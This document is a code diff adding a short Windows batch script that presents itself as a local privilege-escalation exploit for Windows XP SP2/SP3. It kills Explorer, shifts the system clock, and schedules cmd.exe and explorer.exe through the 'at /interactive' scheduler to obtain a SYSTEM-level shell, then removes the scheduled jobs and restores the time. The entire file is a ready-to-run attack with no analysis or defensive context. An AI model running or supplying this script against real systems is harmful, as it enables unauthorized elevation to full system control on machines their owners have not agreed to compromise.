@@ -1,0 +1,25 @@
+@echo off
+echo [+] Microsoft WinXP sp2/sp3 local system privilege escalation exploit
+start time /T > time.txt
+tskill explorer
+time 13:36:59 > nul
+at 13:37 /interactive cmd.exe
+at 13:37 /interactive explorer.exe
+at 13:37 /interactive at /del /y
+cls
+at 13:37 /interactive cmd.exe
+at 13:37 /interactive explorer.exe
+at 13:37 /interactive at /del /y
+cls
+at 13:37 /interactive cmd.exe
+at 13:37 /interactive explorer.exe
+at 13:37 /interactive at /del /y
+cls
+at 13:37 /interactive cmd.exe
+at 13:37 /interactive explorer.exe
+at 13:37 /interactive at /del /y
+
+
+echo [*] Backup time
+time < time.txt
+
